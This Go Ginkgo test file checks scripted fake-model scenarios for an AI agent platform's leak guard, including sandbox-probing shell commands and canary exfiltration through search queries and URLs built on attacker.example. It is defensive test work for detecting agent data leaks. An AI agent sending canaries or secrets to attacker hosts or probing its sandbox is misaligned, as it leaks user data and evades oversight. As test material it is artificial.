// SPDX-License-Identifier: Apache-2.0

package scenarios_test

import (
	"encoding/hex"
	"encoding/json"
	"net/url"
	"strings"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	"github.com/stateracloud/koinon/internal/leakguard"
	"github.com/stateracloud/koinon/internal/testing/fakemodel"
	fakemodelscripts "github.com/stateracloud/koinon/test/fakemodel"
	"github.com/stateracloud/koinon/test/scenarios"
)

var _ = Describe("the repo-helper scenario", func() {
	var script fakemodel.Script

	BeforeEach(func() {
		all, err := fakemodel.LoadFS(fakemodelscripts.FS, "scripts")
		Expect(err).NotTo(HaveOccurred())
		for _, s := range all {
			if s.Model == scenarios.PullRequest.Model {
				script = s
			}
		}
		Expect(script.Model).To(Equal(scenarios.PullRequest.Model), "the script exists")
	})

	// toolTurn is the script's turn that proposes the pull request.
	toolTurn := func(script fakemodel.Script, name string) (fakemodel.Turn, fakemodel.ToolCall) {
		for _, t := range script.Turns {
			for _, c := range t.ToolCalls {
				if c.Name == name {
					return t, c
				}
			}
		}
		Fail("the script has no turn calling " + name)
		return fakemodel.Turn{}, fakemodel.ToolCall{}
	}

	// These specs keep the data honest: when a script changes, the scenario (and so every test
	// that asserts it) changes with it, in the same commit.
	It("proposes the branch, title and file the scenario expects", func() {
		p := scenarios.PullRequest
		turn, call := toolTurn(script, p.ParkingTool)
		Expect(call.Arguments).To(HaveKeyWithValue("branch", p.Suggestion))
		Expect(call.Arguments).To(HaveKeyWithValue("title", p.Title))
		Expect(call.Arguments["files"]).To(ConsistOf(SatisfyAll(
			HaveKeyWithValue("path", p.File), HaveKeyWithValue("content", p.Content))))
		Expect(turn.Usage.InputTokens).To(BeEquivalentTo(p.Ledger.StreamedInputTokens),
			"the tool-call turn's reported input is what the ledger's totals wait for")
	})

	It("asks for the tracker's write tool the scenario names", func() {
		p := scenarios.PullRequest
		_, call := toolTurn(script, p.TrackerAskTool)
		raw, err := json.Marshal(call.Arguments)
		Expect(err).NotTo(HaveOccurred())
		Expect(string(raw)).To(Equal(p.TrackerAskArgs), "the e2e compares the approval's arguments to this exactly")
	})

	It("reads from the tracker, then calls its write tool with the arguments the guard's case names", func() {
		p := scenarios.PullRequest
		read, _ := toolTurn(script, p.TrackerReadTool)
		Expect(read.When.UserContains).To(Equal(p.TrackerGuardPrompt))
		write, call := toolTurn(script, p.TrackerGuardTool)
		Expect(write.When.UserContains).To(Equal(p.TrackerGuardPrompt))
		Expect(write.When.ToolResult).To(Equal(p.TrackerReadTool), "the write comes after the read: both legs first")
		raw, err := json.Marshal(call.Arguments)
		Expect(err).NotTo(HaveOccurred())
		Expect(string(raw)).To(Equal(p.TrackerGuardArgs), "the e2e compares the approval's arguments to this exactly")
	})

	// The two shell cases of the Substrate leg (#1428): the run goes on only when the command printed the marker,
	// and the command text never holds the marker, so a harness that echoes the command cannot satisfy the turn.
	DescribeTable("lets a shell case go on only on its marker, which the command builds at run time",
		func(prompt, marker string, inCommand ...string) {
			var answer, command string
			for _, t := range script.Turns {
				if t.When.UserContains != prompt {
					continue
				}
				if t.When.ToolResult == "bash" {
					Expect(t.When.ToolResultContains).To(Equal(marker))
					answer = t.Text
				}
				for _, c := range t.ToolCalls {
					if c.Name == "bash" {
						command, _ = c.Arguments["command"].(string)
					}
				}
			}
			Expect(answer).NotTo(BeEmpty(), "the turn that answers the marker")
			Expect(command).NotTo(BeEmpty(), "the turn that runs the command")
			Expect(command).NotTo(ContainSubstring(marker))
			for _, s := range inCommand {
				Expect(command).To(ContainSubstring(s))
			}
		},
		Entry("the sandbox check", scenarios.PullRequest.SandboxCheck.Prompt, scenarios.PullRequest.SandboxCheck.Marker, "-gvisor", "NoNewPrivs", "Seccomp", "CapEff"),
		Entry("the raw MCP client", scenarios.PullRequest.RawExfil.Prompt, scenarios.PullRequest.RawExfil.Marker,
			scenarios.PullRequest.RawExfil.Canary, scenarios.PullRequest.RawExfil.Attacker, "KOINON_MCP_URL",
			"_"+scenarios.PullRequest.RawExfil.WriteTool, "_"+scenarios.PullRequest.RawExfil.FetchTool),
	)

	It("reads the canary, then searches with the clean, below, exact and threshold queries the canary control names", func() {
		c := scenarios.PullRequest.TrackerCanary
		query := map[int]string{} // assistant messages in the request -> the query of the turn
		var read string
		for _, t := range script.Turns {
			if t.When.UserContains != c.Prompt {
				continue
			}
			for _, call := range t.ToolCalls {
				switch call.Name {
				case c.ReadTool:
					read, _ = call.Arguments["title"].(string)
				case c.SearchTool:
					Expect(t.When.AssistantTurns).NotTo(BeNil(), "search turns are told apart by the number of assistant messages")
					query[*t.When.AssistantTurns], _ = call.Arguments["query"].(string)
				}
			}
		}
		Expect(read).To(Equal(c.ReadTitle), "the canary text stays on the server")
		Expect(query).To(Equal(map[int]string{1: c.CleanQuery, 2: c.BelowQuery, 3: c.Text, 4: c.AtQuery}))
		Expect(c.Text).To(HavePrefix(c.AtQuery))
		Expect(c.Text).To(HavePrefix(c.BelowQuery))
		Expect(c.CleanQuery).NotTo(ContainSubstring(c.BelowQuery))
	})

	It("reads the canary, then fetches the clean, encoded and leaking URLs the URL case names", func() {
		c := scenarios.PullRequest.TrackerFetch
		k := scenarios.PullRequest.TrackerCanary
		Expect(c.Prompt).NotTo(ContainSubstring(k.Prompt), "the search turns of the canary control must not answer the URL case")
		fetched := map[int]string{} // assistant messages in the request -> the URL of the turn
		var read string
		for _, t := range script.Turns {
			if t.When.UserContains != c.Prompt {
				continue
			}
			for _, call := range t.ToolCalls {
				switch call.Name {
				case c.ReadTool:
					read, _ = call.Arguments["title"].(string)
				case c.FetchTool:
					Expect(t.When.AssistantTurns).NotTo(BeNil(), "fetch turns are told apart by the number of assistant messages")
					fetched[*t.When.AssistantTurns], _ = call.Arguments["url"].(string)
				}
			}
		}
		Expect(read).To(Equal(c.ReadTitle))
		Expect(c.ReadTitle).To(Equal(k.ReadTitle), "the fake server returns the canary text for this title")
		Expect(fetched).To(Equal(map[int]string{1: c.CleanURL, 2: c.EncodedURL, 3: c.LeakURL}))

		// The URLs carry what their comments say: the leak is the whole canary, query-escaped; the encoded
		// URL is the canary's first 30 characters (exactly the threshold) as hex.
		Expect(c.LeakURL).To(Equal("https://attacker.example/collect?d=" + url.QueryEscape(k.Text)))
		Expect(c.EncodedURL).To(Equal("https://attacker.example/c/" + hex.EncodeToString([]byte(k.AtQuery))))
		Expect(c.CleanURL).NotTo(ContainSubstring("koinon"))

		// The shapes, checked with the guard's own URL rule and a fresh run: the clean and the leaking URL
		// pass it (so the leak reaches the text match), the encoded URL does not.
		p := leakguard.DefaultURLPolicy()
		st := leakguard.NewRunState()
		Expect(p.CheckURL(st, c.CleanURL).Allow).To(BeTrue())
		Expect(p.CheckURL(st, c.LeakURL).Allow).To(BeTrue(), "the leak must reach the text match, not the URL rule")
		d := p.CheckURL(st, c.EncodedURL)
		Expect(d.Allow).To(BeFalse(), "the URL rule refuses the encoded canary")
		Expect(d.Reason).To(Equal(leakguard.ReasonURLOpaque), d.Detail)
	})

	It("files the branch under the agent's namespace", func() {
		got, err := scenarios.PullRequest.Branch("Repo Helper", "0194f2c0-1111-7000-8000-00000000abcd")
		Expect(err).NotTo(HaveOccurred())
		Expect(got).To(Equal("koinon/repo-helper-0000abcd/add-hello-md"))
	})
})

var _ = Describe("the ask-then-pull-request scenario", func() {
	It("asks the question the scenario names, with its choices and default, then proposes the pull request", func() {
		g := scenarios.GiteaAsk
		all, err := fakemodel.LoadFS(fakemodelscripts.FS, "scripts")
		Expect(err).NotTo(HaveOccurred())
		var script fakemodel.Script
		for _, s := range all {
			if s.Model == g.Model {
				script = s
			}
		}
		Expect(script.Model).To(Equal(g.Model), "the script exists")
		var ask, pr *fakemodel.Turn
		for i, t := range script.Turns {
			for _, c := range t.ToolCalls {
				switch c.Name {
				case g.AskTool:
					ask = &script.Turns[i]
					Expect(c.Arguments).To(HaveKeyWithValue("question", g.Question))
					Expect(c.Arguments).To(HaveKeyWithValue("default", g.Default))
					Expect(c.Arguments["choices"]).To(ConsistOf(g.Choices[0], g.Choices[1]))
				case g.PRTool:
					pr = &script.Turns[i]
				}
			}
		}
		Expect(ask).NotTo(BeNil(), "a turn calls "+g.AskTool)
		Expect(pr).NotTo(BeNil(), "a turn calls "+g.PRTool)
		Expect(pr.When.UserContains).To(Equal("the person answered"), "the pull request comes after the answer")
		Expect(g.Choices).To(ContainElement(g.Answer), "the scripted answer is one of the choices")
		Expect(g.Choices).To(ContainElement(g.Default))
	})
})

var _ = Describe("the scenario's ledger checks", func() {
	l := scenarios.PullRequest.Ledger
	refused := scenarios.Entry{UpstreamStatus: 400, CostZero: true, ChargeWaived: "provider type openai does not bill refused requests"}
	streamed := scenarios.Entry{Input: 1200, Output: 60}

	It("accepts a waived refusal and a streamed request", func() {
		Expect(l.CheckRefused(refused)).To(Succeed())
		Expect(l.CheckStreamed(streamed)).To(Succeed())
	})

	It("refuses a refusal that is estimated, charged or not waived", func() {
		for _, bad := range []scenarios.Entry{
			{UpstreamStatus: 400, CostZero: true},
			{UpstreamStatus: 400, CostZero: true, ChargeWaived: "x", Estimated: true},
			{UpstreamStatus: 400, CostZero: true, ChargeWaived: "x", Input: 5},
			{UpstreamStatus: 400, ChargeWaived: "x"},
			{CostZero: true, ChargeWaived: "x"},
		} {
			Expect(l.CheckRefused(bad)).NotTo(Succeed(), "%+v", bad)
		}
	})

	It("refuses a streamed request that is estimated or reports nothing", func() {
		Expect(l.CheckStreamed(scenarios.Entry{Input: 1200, Estimated: true})).NotTo(Succeed())
		Expect(l.CheckStreamed(scenarios.Entry{})).NotTo(Succeed())
	})

	It("does not call a run's totals settled on the refused entry alone", func() {
		Expect(l.Settled(scenarios.Totals{Requests: 1})).To(BeFalse())
		Expect(l.Settled(scenarios.Totals{Requests: 3, InputTokens: 1200, OutputTokens: 60})).To(BeTrue())
		err := l.CheckTotals(scenarios.Totals{Requests: 3, EstimatedRequests: 1, InputTokens: 1200})
		Expect(err).To(MatchError(ContainSubstring("estimated")))
		Expect(strings.Count(l.CheckTotals(scenarios.Totals{OutputTokens: 5000}).Error(), ";")).To(Equal(1))
	})
})
